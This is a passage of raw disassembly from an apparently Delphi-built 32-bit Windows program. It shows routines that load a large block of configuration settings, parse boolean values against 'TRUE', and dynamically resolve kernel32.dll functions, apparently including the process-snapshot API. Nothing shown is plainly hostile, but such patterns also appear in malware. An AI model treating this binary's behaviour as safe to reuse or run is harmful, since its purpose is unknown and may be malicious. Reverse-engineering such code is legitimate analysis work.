  4047a2:	59                   	pop    %ecx
  4047a3:	59                   	pop    %ecx
  4047a4:	64 89 10             	mov    %edx,%fs:(%eax)
  4047a7:	68 bc 47 40 00       	push   $0x4047bc
  4047ac:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4047af:	e8 0c d3 ff ff       	call   0x401ac0
  4047b4:	c3                   	ret
  4047b5:	e9 52 d0 ff ff       	jmp    0x40180c
  4047ba:	eb f0                	jmp    0x4047ac
  4047bc:	5f                   	pop    %edi
  4047bd:	5e                   	pop    %esi
  4047be:	5b                   	pop    %ebx
  4047bf:	59                   	pop    %ecx
  4047c0:	5d                   	pop    %ebp
  4047c1:	c3                   	ret
  4047c2:	8b c0                	mov    %eax,%eax
  4047c4:	55                   	push   %ebp
  4047c5:	8b ec                	mov    %esp,%ebp
  4047c7:	51                   	push   %ecx
  4047c8:	53                   	push   %ebx
  4047c9:	56                   	push   %esi
  4047ca:	57                   	push   %edi
  4047cb:	8b fa                	mov    %edx,%edi
  4047cd:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4047d0:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4047d3:	e8 60 d7 ff ff       	call   0x401f38
  4047d8:	33 c0                	xor    %eax,%eax
  4047da:	55                   	push   %ebp
  4047db:	68 39 48 40 00       	push   $0x404839
  4047e0:	64 ff 30             	push   %fs:(%eax)
  4047e3:	64 89 20             	mov    %esp,%fs:(%eax)
  4047e6:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4047e9:	e8 62 d5 ff ff       	call   0x401d50
  4047ee:	8b f0                	mov    %eax,%esi
  4047f0:	85 f6                	test   %esi,%esi
  4047f2:	7e 25                	jle    0x404819
  4047f4:	bb 01 00 00 00       	mov    $0x1,%ebx
  4047f9:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4047fc:	0f b6 44 18 ff       	movzbl -0x1(%eax,%ebx,1),%eax
  404801:	50                   	push   %eax
  404802:	e8 d1 ee ff ff       	call   0x4036d8
  404807:	50                   	push   %eax
  404808:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40480b:	e8 8c d7 ff ff       	call   0x401f9c
  404810:	5a                   	pop    %edx
  404811:	88 54 18 ff          	mov    %dl,-0x1(%eax,%ebx,1)
  404815:	43                   	inc    %ebx
  404816:	4e                   	dec    %esi
  404817:	75 e0                	jne    0x4047f9
  404819:	8b c7                	mov    %edi,%eax
  40481b:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40481e:	e8 f1 d2 ff ff       	call   0x401b14
  404823:	33 c0                	xor    %eax,%eax
  404825:	5a                   	pop    %edx
  404826:	59                   	pop    %ecx
  404827:	59                   	pop    %ecx
  404828:	64 89 10             	mov    %edx,%fs:(%eax)
  40482b:	68 40 48 40 00       	push   $0x404840
  404830:	8d 45 fc             	lea    -0x4(%ebp),%eax
  404833:	e8 88 d2 ff ff       	call   0x401ac0
  404838:	c3                   	ret
  404839:	e9 ce cf ff ff       	jmp    0x40180c
  40483e:	eb f0                	jmp    0x404830
  404840:	5f                   	pop    %edi
  404841:	5e                   	pop    %esi
  404842:	5b                   	pop    %ebx
  404843:	59                   	pop    %ecx
  404844:	5d                   	pop    %ebp
  404845:	c3                   	ret
  404846:	8b c0                	mov    %eax,%eax
  404848:	55                   	push   %ebp
  404849:	8b ec                	mov    %esp,%ebp
  40484b:	33 c0                	xor    %eax,%eax
  40484d:	55                   	push   %ebp
  40484e:	68 6d 48 40 00       	push   $0x40486d
  404853:	64 ff 30             	push   %fs:(%eax)
  404856:	64 89 20             	mov    %esp,%fs:(%eax)
  404859:	ff 05 28 e8 40 00    	incl   0x40e828
  40485f:	33 c0                	xor    %eax,%eax
  404861:	5a                   	pop    %edx
  404862:	59                   	pop    %ecx
  404863:	59                   	pop    %ecx
  404864:	64 89 10             	mov    %edx,%fs:(%eax)
  404867:	68 74 48 40 00       	push   $0x404874
  40486c:	c3                   	ret
  40486d:	e9 9a cf ff ff       	jmp    0x40180c
  404872:	eb f8                	jmp    0x40486c
  404874:	5d                   	pop    %ebp
  404875:	c3                   	ret
  404876:	8b c0                	mov    %eax,%eax
  404878:	83 2d 28 e8 40 00 01 	subl   $0x1,0x40e828
  40487f:	c3                   	ret
  404880:	55                   	push   %ebp
  404881:	8b ec                	mov    %esp,%ebp
  404883:	51                   	push   %ecx
  404884:	53                   	push   %ebx
  404885:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404888:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40488b:	e8 a8 d6 ff ff       	call   0x401f38
  404890:	33 c0                	xor    %eax,%eax
  404892:	55                   	push   %ebp
  404893:	68 c7 48 40 00       	push   $0x4048c7
  404898:	64 ff 30             	push   %fs:(%eax)
  40489b:	64 89 20             	mov    %esp,%fs:(%eax)
  40489e:	33 db                	xor    %ebx,%ebx
  4048a0:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4048a3:	ba dc 48 40 00       	mov    $0x4048dc,%edx
  4048a8:	e8 e7 d5 ff ff       	call   0x401e94
  4048ad:	75 02                	jne    0x4048b1
  4048af:	b3 01                	mov    $0x1,%bl
  4048b1:	33 c0                	xor    %eax,%eax
  4048b3:	5a                   	pop    %edx
  4048b4:	59                   	pop    %ecx
  4048b5:	59                   	pop    %ecx
  4048b6:	64 89 10             	mov    %edx,%fs:(%eax)
  4048b9:	68 ce 48 40 00       	push   $0x4048ce
  4048be:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4048c1:	e8 fa d1 ff ff       	call   0x401ac0
  4048c6:	c3                   	ret
  4048c7:	e9 40 cf ff ff       	jmp    0x40180c
  4048cc:	eb f0                	jmp    0x4048be
  4048ce:	8b c3                	mov    %ebx,%eax
  4048d0:	5b                   	pop    %ebx
  4048d1:	59                   	pop    %ecx
  4048d2:	5d                   	pop    %ebp
  4048d3:	c3                   	ret
  4048d4:	ff                   	(bad)
  4048d5:	ff                   	(bad)
  4048d6:	ff                   	(bad)
  4048d7:	ff 04 00             	incl   (%eax,%eax,1)
  4048da:	00 00                	add    %al,(%eax)
  4048dc:	54                   	push   %esp
  4048dd:	52                   	push   %edx
  4048de:	55                   	push   %ebp
  4048df:	45                   	inc    %ebp
  4048e0:	00 00                	add    %al,(%eax)
  4048e2:	00 00                	add    %al,(%eax)
  4048e4:	55                   	push   %ebp
  4048e5:	8b ec                	mov    %esp,%ebp
  4048e7:	33 c0                	xor    %eax,%eax
  4048e9:	55                   	push   %ebp
  4048ea:	68 09 49 40 00       	push   $0x404909
  4048ef:	64 ff 30             	push   %fs:(%eax)
  4048f2:	64 89 20             	mov    %esp,%fs:(%eax)
  4048f5:	ff 05 30 e8 40 00    	incl   0x40e830
  4048fb:	33 c0                	xor    %eax,%eax
  4048fd:	5a                   	pop    %edx
  4048fe:	59                   	pop    %ecx
  4048ff:	59                   	pop    %ecx
  404900:	64 89 10             	mov    %edx,%fs:(%eax)
  404903:	68 10 49 40 00       	push   $0x404910
  404908:	c3                   	ret
  404909:	e9 fe ce ff ff       	jmp    0x40180c
  40490e:	eb f8                	jmp    0x404908
  404910:	5d                   	pop    %ebp
  404911:	c3                   	ret
  404912:	8b c0                	mov    %eax,%eax
  404914:	83 2d 30 e8 40 00 01 	subl   $0x1,0x40e830
  40491b:	c3                   	ret
  40491c:	53                   	push   %ebx
  40491d:	56                   	push   %esi
  40491e:	57                   	push   %edi
  40491f:	55                   	push   %ebp
  404920:	8b 1d c4 d1 40 00    	mov    0x40d1c4,%ebx
  404926:	bd 14 00 00 00       	mov    $0x14,%ebp
  40492b:	8b f3                	mov    %ebx,%esi
  40492d:	bf 34 e8 40 00       	mov    $0x40e834,%edi
  404932:	8b c7                	mov    %edi,%eax
  404934:	8b 16                	mov    (%esi),%edx
  404936:	e8 d9 d1 ff ff       	call   0x401b14
  40493b:	83 c7 04             	add    $0x4,%edi
  40493e:	83 c6 04             	add    $0x4,%esi
  404941:	4d                   	dec    %ebp
  404942:	75 ee                	jne    0x404932
  404944:	b8 84 e8 40 00       	mov    $0x40e884,%eax
  404949:	8b 53 50             	mov    0x50(%ebx),%edx
  40494c:	e8 c3 d1 ff ff       	call   0x401b14
  404951:	b8 88 e8 40 00       	mov    $0x40e888,%eax
  404956:	8b 53 54             	mov    0x54(%ebx),%edx
  404959:	e8 b6 d1 ff ff       	call   0x401b14
  40495e:	8b 43 58             	mov    0x58(%ebx),%eax
  404961:	e8 1a ff ff ff       	call   0x404880
  404966:	a2 8c e8 40 00       	mov    %al,0x40e88c
  40496b:	8b 43 5c             	mov    0x5c(%ebx),%eax
  40496e:	e8 75 fd ff ff       	call   0x4046e8
  404973:	a3 90 e8 40 00       	mov    %eax,0x40e890
  404978:	b8 94 e8 40 00       	mov    $0x40e894,%eax
  40497d:	8b 53 60             	mov    0x60(%ebx),%edx
  404980:	e8 8f d1 ff ff       	call   0x401b14
  404985:	b8 98 e8 40 00       	mov    $0x40e898,%eax
  40498a:	8b 53 64             	mov    0x64(%ebx),%edx
  40498d:	e8 82 d1 ff ff       	call   0x401b14
  404992:	b8 9c e8 40 00       	mov    $0x40e89c,%eax
  404997:	8b 53 68             	mov    0x68(%ebx),%edx
  40499a:	e8 75 d1 ff ff       	call   0x401b14
  40499f:	b8 a0 e8 40 00       	mov    $0x40e8a0,%eax
  4049a4:	8b 53 6c             	mov    0x6c(%ebx),%edx
  4049a7:	e8 68 d1 ff ff       	call   0x401b14
  4049ac:	b8 a4 e8 40 00       	mov    $0x40e8a4,%eax
  4049b1:	8b 53 70             	mov    0x70(%ebx),%edx
  4049b4:	e8 5b d1 ff ff       	call   0x401b14
  4049b9:	b8 a8 e8 40 00       	mov    $0x40e8a8,%eax
  4049be:	8b 53 74             	mov    0x74(%ebx),%edx
  4049c1:	e8 4e d1 ff ff       	call   0x401b14
  4049c6:	8b 43 78             	mov    0x78(%ebx),%eax
  4049c9:	e8 b2 fe ff ff       	call   0x404880
  4049ce:	a2 b0 e8 40 00       	mov    %al,0x40e8b0
  4049d3:	8b 43 7c             	mov    0x7c(%ebx),%eax
  4049d6:	e8 0d fd ff ff       	call   0x4046e8
  4049db:	a3 b4 e8 40 00       	mov    %eax,0x40e8b4
  4049e0:	8b 83 80 00 00 00    	mov    0x80(%ebx),%eax
  4049e6:	e8 fd fc ff ff       	call   0x4046e8
  4049eb:	a3 b8 e8 40 00       	mov    %eax,0x40e8b8
  4049f0:	b8 bc e8 40 00       	mov    $0x40e8bc,%eax
  4049f5:	8b 93 84 00 00 00    	mov    0x84(%ebx),%edx
  4049fb:	e8 14 d1 ff ff       	call   0x401b14
  404a00:	b8 c0 e8 40 00       	mov    $0x40e8c0,%eax
  404a05:	8b 93 88 00 00 00    	mov    0x88(%ebx),%edx
  404a0b:	e8 04 d1 ff ff       	call   0x401b14
  404a10:	8b 83 8c 00 00 00    	mov    0x8c(%ebx),%eax
  404a16:	e8 65 fe ff ff       	call   0x404880
  404a1b:	a2 c4 e8 40 00       	mov    %al,0x40e8c4
  404a20:	8b 83 90 00 00 00    	mov    0x90(%ebx),%eax
  404a26:	e8 55 fe ff ff       	call   0x404880
  404a2b:	a2 c5 e8 40 00       	mov    %al,0x40e8c5
  404a30:	8b 83 94 00 00 00    	mov    0x94(%ebx),%eax
  404a36:	e8 45 fe ff ff       	call   0x404880
  404a3b:	a2 c6 e8 40 00       	mov    %al,0x40e8c6
  404a40:	b8 c8 e8 40 00       	mov    $0x40e8c8,%eax
  404a45:	8b 93 98 00 00 00    	mov    0x98(%ebx),%edx
  404a4b:	e8 c4 d0 ff ff       	call   0x401b14
  404a50:	b8 cc e8 40 00       	mov    $0x40e8cc,%eax
  404a55:	8b 93 9c 00 00 00    	mov    0x9c(%ebx),%edx
  404a5b:	e8 b4 d0 ff ff       	call   0x401b14
  404a60:	b8 d0 e8 40 00       	mov    $0x40e8d0,%eax
  404a65:	8b 93 a4 00 00 00    	mov    0xa4(%ebx),%edx
  404a6b:	e8 a4 d0 ff ff       	call   0x401b14
  404a70:	b8 d4 e8 40 00       	mov    $0x40e8d4,%eax
  404a75:	8b 93 a8 00 00 00    	mov    0xa8(%ebx),%edx
  404a7b:	e8 94 d0 ff ff       	call   0x401b14
  404a80:	8b 83 ac 00 00 00    	mov    0xac(%ebx),%eax
  404a86:	e8 5d fc ff ff       	call   0x4046e8
  404a8b:	a3 d8 e8 40 00       	mov    %eax,0x40e8d8
  404a90:	8b 83 b0 00 00 00    	mov    0xb0(%ebx),%eax
  404a96:	e8 4d fc ff ff       	call   0x4046e8
  404a9b:	a3 dc e8 40 00       	mov    %eax,0x40e8dc
  404aa0:	8b 83 b4 00 00 00    	mov    0xb4(%ebx),%eax
  404aa6:	e8 d5 fd ff ff       	call   0x404880
  404aab:	a2 e0 e8 40 00       	mov    %al,0x40e8e0
  404ab0:	8b 83 b8 00 00 00    	mov    0xb8(%ebx),%eax
  404ab6:	e8 c5 fd ff ff       	call   0x404880
  404abb:	a2 e1 e8 40 00       	mov    %al,0x40e8e1
  404ac0:	8b 83 bc 00 00 00    	mov    0xbc(%ebx),%eax
  404ac6:	e8 b5 fd ff ff       	call   0x404880
  404acb:	a2 e2 e8 40 00       	mov    %al,0x40e8e2
  404ad0:	8b 83 c0 00 00 00    	mov    0xc0(%ebx),%eax
  404ad6:	e8 a5 fd ff ff       	call   0x404880
  404adb:	a2 e3 e8 40 00       	mov    %al,0x40e8e3
  404ae0:	8b 83 c4 00 00 00    	mov    0xc4(%ebx),%eax
  404ae6:	e8 95 fd ff ff       	call   0x404880
  404aeb:	a2 e4 e8 40 00       	mov    %al,0x40e8e4
  404af0:	8b 83 c8 00 00 00    	mov    0xc8(%ebx),%eax
  404af6:	e8 85 fd ff ff       	call   0x404880
  404afb:	a2 e5 e8 40 00       	mov    %al,0x40e8e5
  404b00:	8b 83 cc 00 00 00    	mov    0xcc(%ebx),%eax
  404b06:	e8 75 fd ff ff       	call   0x404880
  404b0b:	a2 e6 e8 40 00       	mov    %al,0x40e8e6
  404b10:	8b 83 d0 00 00 00    	mov    0xd0(%ebx),%eax
  404b16:	e8 65 fd ff ff       	call   0x404880
  404b1b:	a2 e7 e8 40 00       	mov    %al,0x40e8e7
  404b20:	8b 83 d4 00 00 00    	mov    0xd4(%ebx),%eax
  404b26:	e8 55 fd ff ff       	call   0x404880
  404b2b:	a2 e8 e8 40 00       	mov    %al,0x40e8e8
  404b30:	8b 83 d8 00 00 00    	mov    0xd8(%ebx),%eax
  404b36:	e8 45 fd ff ff       	call   0x404880
  404b3b:	a2 e9 e8 40 00       	mov    %al,0x40e8e9
  404b40:	8b 83 dc 00 00 00    	mov    0xdc(%ebx),%eax
  404b46:	e8 35 fd ff ff       	call   0x404880
  404b4b:	a2 ea e8 40 00       	mov    %al,0x40e8ea
  404b50:	8b 83 e0 00 00 00    	mov    0xe0(%ebx),%eax
  404b56:	e8 25 fd ff ff       	call   0x404880
  404b5b:	a2 eb e8 40 00       	mov    %al,0x40e8eb
  404b60:	8b 83 e4 00 00 00    	mov    0xe4(%ebx),%eax
  404b66:	e8 7d fb ff ff       	call   0x4046e8
  404b6b:	a3 ec e8 40 00       	mov    %eax,0x40e8ec
  404b70:	b8 f0 e8 40 00       	mov    $0x40e8f0,%eax
  404b75:	8b 93 e8 00 00 00    	mov    0xe8(%ebx),%edx
  404b7b:	e8 94 cf ff ff       	call   0x401b14
  404b80:	8b 83 ec 00 00 00    	mov    0xec(%ebx),%eax
  404b86:	e8 f5 fc ff ff       	call   0x404880
  404b8b:	a2 f4 e8 40 00       	mov    %al,0x40e8f4
  404b90:	8b 83 f0 00 00 00    	mov    0xf0(%ebx),%eax
  404b96:	e8 e5 fc ff ff       	call   0x404880
  404b9b:	a2 f5 e8 40 00       	mov    %al,0x40e8f5
  404ba0:	8b 83 f4 00 00 00    	mov    0xf4(%ebx),%eax
  404ba6:	e8 d5 fc ff ff       	call   0x404880
  404bab:	a2 f6 e8 40 00       	mov    %al,0x40e8f6
  404bb0:	b8 f8 e8 40 00       	mov    $0x40e8f8,%eax
  404bb5:	8b 93 f8 00 00 00    	mov    0xf8(%ebx),%edx
  404bbb:	e8 54 cf ff ff       	call   0x401b14
  404bc0:	8b 83 fc 00 00 00    	mov    0xfc(%ebx),%eax
  404bc6:	e8 b5 fc ff ff       	call   0x404880
  404bcb:	a2 fc e8 40 00       	mov    %al,0x40e8fc
  404bd0:	b8 00 e9 40 00       	mov    $0x40e900,%eax
  404bd5:	8b 93 00 01 00 00    	mov    0x100(%ebx),%edx
  404bdb:	e8 34 cf ff ff       	call   0x401b14
  404be0:	b8 04 e9 40 00       	mov    $0x40e904,%eax
  404be5:	8b 93 04 01 00 00    	mov    0x104(%ebx),%edx
  404beb:	e8 24 cf ff ff       	call   0x401b14
  404bf0:	b8 08 e9 40 00       	mov    $0x40e908,%eax
  404bf5:	8b 93 10 01 00 00    	mov    0x110(%ebx),%edx
  404bfb:	e8 14 cf ff ff       	call   0x401b14
  404c00:	b8 ac e8 40 00       	mov    $0x40e8ac,%eax
  404c05:	8b 93 14 01 00 00    	mov    0x114(%ebx),%edx
  404c0b:	e8 04 cf ff ff       	call   0x401b14
  404c10:	8b 83 18 01 00 00    	mov    0x118(%ebx),%eax
  404c16:	e8 65 fc ff ff       	call   0x404880
  404c1b:	a2 10 e9 40 00       	mov    %al,0x40e910
  404c20:	b8 0c e9 40 00       	mov    $0x40e90c,%eax
  404c25:	8b 93 1c 01 00 00    	mov    0x11c(%ebx),%edx
  404c2b:	e8 e4 ce ff ff       	call   0x401b14
  404c30:	b8 14 e9 40 00       	mov    $0x40e914,%eax
  404c35:	8b 93 20 01 00 00    	mov    0x120(%ebx),%edx
  404c3b:	e8 d4 ce ff ff       	call   0x401b14
  404c40:	b8 18 e9 40 00       	mov    $0x40e918,%eax
  404c45:	8b 93 24 01 00 00    	mov    0x124(%ebx),%edx
  404c4b:	e8 c4 ce ff ff       	call   0x401b14
  404c50:	8b 83 28 01 00 00    	mov    0x128(%ebx),%eax
  404c56:	e8 25 fc ff ff       	call   0x404880
  404c5b:	8b 15 e8 d1 40 00    	mov    0x40d1e8,%edx
  404c61:	88 02                	mov    %al,(%edx)
  404c63:	b8 20 e9 40 00       	mov    $0x40e920,%eax
  404c68:	8b 93 8c 01 00 00    	mov    0x18c(%ebx),%edx
  404c6e:	e8 a1 ce ff ff       	call   0x401b14
  404c73:	b8 24 e9 40 00       	mov    $0x40e924,%eax
  404c78:	8b 93 90 01 00 00    	mov    0x190(%ebx),%edx
  404c7e:	e8 91 ce ff ff       	call   0x401b14
  404c83:	5d                   	pop    %ebp
  404c84:	5f                   	pop    %edi
  404c85:	5e                   	pop    %esi
  404c86:	5b                   	pop    %ebx
  404c87:	c3                   	ret
  404c88:	55                   	push   %ebp
  404c89:	8b ec                	mov    %esp,%ebp
  404c8b:	33 c0                	xor    %eax,%eax
  404c8d:	55                   	push   %ebp
  404c8e:	68 fe 4d 40 00       	push   $0x404dfe
  404c93:	64 ff 30             	push   %fs:(%eax)
  404c96:	64 89 20             	mov    %esp,%fs:(%eax)
  404c99:	ff 05 3c e9 40 00    	incl   0x40e93c
  404c9f:	0f 85 4b 01 00 00    	jne    0x404df0
  404ca5:	b8 38 e9 40 00       	mov    $0x40e938,%eax
  404caa:	e8 11 ce ff ff       	call   0x401ac0
  404caf:	b8 34 e9 40 00       	mov    $0x40e934,%eax
  404cb4:	e8 07 ce ff ff       	call   0x401ac0
  404cb9:	b8 30 e9 40 00       	mov    $0x40e930,%eax
  404cbe:	e8 fd cd ff ff       	call   0x401ac0
  404cc3:	b8 2c e9 40 00       	mov    $0x40e92c,%eax
  404cc8:	e8 f3 cd ff ff       	call   0x401ac0
  404ccd:	b8 28 e9 40 00       	mov    $0x40e928,%eax
  404cd2:	e8 e9 cd ff ff       	call   0x401ac0
  404cd7:	b8 24 e9 40 00       	mov    $0x40e924,%eax
  404cdc:	e8 df cd ff ff       	call   0x401ac0
  404ce1:	b8 20 e9 40 00       	mov    $0x40e920,%eax
  404ce6:	e8 d5 cd ff ff       	call   0x401ac0
  404ceb:	b8 1c e9 40 00       	mov    $0x40e91c,%eax
  404cf0:	e8 cb cd ff ff       	call   0x401ac0
  404cf5:	b8 18 e9 40 00       	mov    $0x40e918,%eax
  404cfa:	e8 c1 cd ff ff       	call   0x401ac0
  404cff:	b8 14 e9 40 00       	mov    $0x40e914,%eax
  404d04:	e8 b7 cd ff ff       	call   0x401ac0
  404d09:	b8 0c e9 40 00       	mov    $0x40e90c,%eax
  404d0e:	e8 ad cd ff ff       	call   0x401ac0
  404d13:	b8 08 e9 40 00       	mov    $0x40e908,%eax
  404d18:	e8 a3 cd ff ff       	call   0x401ac0
  404d1d:	b8 04 e9 40 00       	mov    $0x40e904,%eax
  404d22:	e8 99 cd ff ff       	call   0x401ac0
  404d27:	b8 00 e9 40 00       	mov    $0x40e900,%eax
  404d2c:	e8 8f cd ff ff       	call   0x401ac0
  404d31:	b8 f8 e8 40 00       	mov    $0x40e8f8,%eax
  404d36:	e8 85 cd ff ff       	call   0x401ac0
  404d3b:	b8 f0 e8 40 00       	mov    $0x40e8f0,%eax
  404d40:	e8 7b cd ff ff       	call   0x401ac0
  404d45:	b8 d4 e8 40 00       	mov    $0x40e8d4,%eax
  404d4a:	e8 71 cd ff ff       	call   0x401ac0
  404d4f:	b8 d0 e8 40 00       	mov    $0x40e8d0,%eax
  404d54:	e8 67 cd ff ff       	call   0x401ac0
  404d59:	b8 cc e8 40 00       	mov    $0x40e8cc,%eax
  404d5e:	e8 5d cd ff ff       	call   0x401ac0
  404d63:	b8 c8 e8 40 00       	mov    $0x40e8c8,%eax
  404d68:	e8 53 cd ff ff       	call   0x401ac0
  404d6d:	b8 c0 e8 40 00       	mov    $0x40e8c0,%eax
  404d72:	e8 49 cd ff ff       	call   0x401ac0
  404d77:	b8 bc e8 40 00       	mov    $0x40e8bc,%eax
  404d7c:	e8 3f cd ff ff       	call   0x401ac0
  404d81:	b8 ac e8 40 00       	mov    $0x40e8ac,%eax
  404d86:	e8 35 cd ff ff       	call   0x401ac0
  404d8b:	b8 a8 e8 40 00       	mov    $0x40e8a8,%eax
  404d90:	e8 2b cd ff ff       	call   0x401ac0
  404d95:	b8 a4 e8 40 00       	mov    $0x40e8a4,%eax
  404d9a:	e8 21 cd ff ff       	call   0x401ac0
  404d9f:	b8 a0 e8 40 00       	mov    $0x40e8a0,%eax
  404da4:	e8 17 cd ff ff       	call   0x401ac0
  404da9:	b8 9c e8 40 00       	mov    $0x40e89c,%eax
  404dae:	e8 0d cd ff ff       	call   0x401ac0
  404db3:	b8 98 e8 40 00       	mov    $0x40e898,%eax
  404db8:	e8 03 cd ff ff       	call   0x401ac0
  404dbd:	b8 94 e8 40 00       	mov    $0x40e894,%eax
  404dc2:	e8 f9 cc ff ff       	call   0x401ac0
  404dc7:	b8 88 e8 40 00       	mov    $0x40e888,%eax
  404dcc:	e8 ef cc ff ff       	call   0x401ac0
  404dd1:	b8 84 e8 40 00       	mov    $0x40e884,%eax
  404dd6:	e8 e5 cc ff ff       	call   0x401ac0
  404ddb:	b8 34 e8 40 00       	mov    $0x40e834,%eax
  404de0:	b9 14 00 00 00       	mov    $0x14,%ecx
  404de5:	8b 15 14 10 40 00    	mov    0x401014,%edx
  404deb:	e8 34 d7 ff ff       	call   0x402524
  404df0:	33 c0                	xor    %eax,%eax
  404df2:	5a                   	pop    %edx
  404df3:	59                   	pop    %ecx
  404df4:	59                   	pop    %ecx
  404df5:	64 89 10             	mov    %edx,%fs:(%eax)
  404df8:	68 05 4e 40 00       	push   $0x404e05
  404dfd:	c3                   	ret
  404dfe:	e9 09 ca ff ff       	jmp    0x40180c
  404e03:	eb f8                	jmp    0x404dfd
  404e05:	5d                   	pop    %ebp
  404e06:	c3                   	ret
  404e07:	90                   	nop
  404e08:	83 2d 3c e9 40 00 01 	subl   $0x1,0x40e93c
  404e0f:	c3                   	ret
  404e10:	53                   	push   %ebx
  404e11:	bb 44 e9 40 00       	mov    $0x40e944,%ebx
  404e16:	83 3b 00             	cmpl   $0x0,(%ebx)
  404e19:	0f 85 35 01 00 00    	jne    0x404f54
  404e1f:	68 6c 4f 40 00       	push   $0x404f6c
  404e24:	e8 cf e7 ff ff       	call   0x4035f8
  404e29:	89 03                	mov    %eax,(%ebx)
  404e2b:	83 3b 00             	cmpl   $0x0,(%ebx)
  404e2e:	0f 84 20 01 00 00    	je     0x404f54
  404e34:	68 7c 4f 40 00       	push   $0x404f7c
  404e39:	8b 03                	mov    (%ebx),%eax
  404e3b:	50                   	push   %eax
  404e3c:	e8 cf e7 ff ff       	call   0x403610
  404e41:	a3 48 e9 40 00       	mov    %eax,0x40e948
  404e46:	68 98 4f 40 00       	push   $0x404f98
  404e4b:	8b 03                	mov    (%ebx),%eax
  404e4d:	50                   	push   %eax
  404e4e:	e8 bd e7 ff ff       	call   0x403610
  404e53:	a3 4c e9 40 00       	mov    %eax,0x40e94c
  404e58:	68 a8 4f 40 00       	push   $0x404fa8
  404e5d:	8b 03                	mov    (%ebx),%eax
  404e5f:	50                   	push   %eax
  404e60:	e8 ab e7 ff ff       	call   0x403610
  404e65:	a3 50 e9 40 00       	mov    %eax,0x40e950
  404e6a:	68 b8 4f 40 00       	push   $0x404fb8
  404e6f:	8b 03                	mov    (%ebx),%eax
  404e71:	50                   	push   %eax
  404e72:	e8 99 e7 ff ff       	call   0x403610
  404e77:	a3 54 e9 40 00       	mov    %eax,0x40e954
  404e7c:	68 c4 4f 40 00       	push   $0x404fc4
  404e81:	8b 03                	mov    (%ebx),%eax
  404e83:	50                   	push   %eax
  404e84:	e8 87 e7 ff ff       	call   0x403610
  404e89:	a3 58 e9 40 00       	mov    %eax,0x40e958
  404e8e:	68 d0 4f 40 00       	push   $0x404fd0
  404e93:	8b 03                	mov    (%ebx),%eax
  404e95:	50                   	push   %eax
  404e96:	e8 75 e7 ff ff       	call   0x403610
  404e9b:	a3 5c e9 40 00       	mov    %eax,0x40e95c
  404ea0:	68 ec 4f 40 00       	push   $0x404fec
  404ea5:	8b 03                	mov    (%ebx),%eax
  404ea7:	50                   	push   %eax
  404ea8:	e8 63 e7 ff ff       	call   0x403610
  404ead:	a3 60 e9 40 00       	mov    %eax,0x40e960
  404eb2:	68 fc 4f 40 00       	push   $0x404ffc
  404eb7:	8b 03                	mov    (%ebx),%eax
  404eb9:	50                   	push   %eax
  404eba:	e8 51 e7 ff ff       	call   0x403610
  404ebf:	a3 64 e9 40 00       	mov    %eax,0x40e964
  404ec4:	68 0c 50 40 00       	push   $0x40500c
  404ec9:	8b 03                	mov    (%ebx),%eax
  404ecb:	50                   	push   %eax
  404ecc:	e8 3f e7 ff ff       	call   0x403610
  404ed1:	a3 68 e9 40 00       	mov    %eax,0x40e968
  404ed6:	68 1c 50 40 00       	push   $0x40501c
  404edb:	8b 03                	mov    (%ebx),%eax
  404edd:	50                   	push   %eax
  404ede:	e8 2d e7 ff ff       	call   0x403610
  404ee3:	a3 6c e9 40 00       	mov    %eax,0x40e96c
  404ee8:	68 2c 50 40 00       	push   $0x40502c
  404eed:	8b 03                	mov    (%ebx),%eax
  404eef:	50                   	push   %eax
  404ef0:	e8 1b e7 ff ff       	call   0x403610
  404ef5:	a3 70 e9 40 00       	mov    %eax,0x40e970
  404efa:	68 3c 50 40 00       	push   $0x40503c
  404eff:	8b 03                	mov    (%ebx),%eax
  404f01:	50                   	push   %eax
  404f02:	e8 09 e7 ff ff       	call   0x403610
  404f07:	a3 74 e9 40 00       	mov    %eax,0x40e974
  404f0c:	68 4c 50 40 00       	push   $0x40504c
  404f11:	8b 03                	mov    (%ebx),%eax
  404f13:	50                   	push   %eax
  404f14:	e8 f7 e6 ff ff       	call   0x403610
  404f19:	a3 78 e9 40 00       	mov    %eax,0x40e978
  404f1e:	68 5c 50 40 00       	push   $0x40505c
  404f23:	8b 03                	mov    (%ebx),%eax
  404f25:	50                   	push   %eax
  404f26:	e8 e5 e6 ff ff       	call   0x403610
  404f2b:	a3 7c e9 40 00       	mov    %eax,0x40e97c
  404f30:	68 6c 50 40 00       	push   $0x40506c
  404f35:	8b 03                	mov    (%ebx),%eax
  404f37:	50                   	push   %eax
  404f38:	e8 d3 e6 ff ff       	call   0x403610
  404f3d:	a3 80 e9 40 00       	mov    %eax,0x40e980
  404f42:	68 7c 50 40 00       	push   $0x40507c
  404f47:	8b 03                	mov    (%ebx),%eax
  404f49:	50                   	push   %eax
  404f4a:	e8 c1 e6 ff ff       	call   0x403610
  404f4f:	a3 84 e9 40 00       	mov    %eax,0x40e984
  404f54:	83 3b 00             	cmpl   $0x0,(%ebx)
  404f57:	74 09                	je     0x404f62
  404f59:	83 3d 48 e9 40 00 00 	cmpl   $0x0,0x40e948
  404f60:	75 04                	jne    0x404f66
  404f62:	33 c0                	xor    %eax,%eax
  404f64:	5b                   	pop    %ebx
  404f65:	c3                   	ret
  404f66:	b0 01                	mov    $0x1,%al
  404f68:	5b                   	pop    %ebx
  404f69:	c3                   	ret
  404f6a:	00 00                	add    %al,(%eax)
  404f6c:	6b 65 72 6e          	imul   $0x6e,0x72(%ebp),%esp
  404f70:	65 6c                	gs insb (%dx),%es:(%edi)
  404f72:	33 32                	xor    (%edx),%esi
  404f74:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  404f77:	6c                   	insb   (%dx),%es:(%edi)
  404f78:	00 00                	add    %al,(%eax)
  404f7a:	00 00                	add    %al,(%eax)
  404f7c:	43                   	inc    %ebx
  404f7d:	72 65                	jb     0x404fe4
  404f7f:	61                   	popa
  404f80:	74 65                	je     0x404fe7
  404f82:	54                   	push   %esp
  404f83:	6f                   	outsl  %ds:(%esi),(%dx)
  404f84:	6f                   	outsl  %ds:(%esi),(%dx)
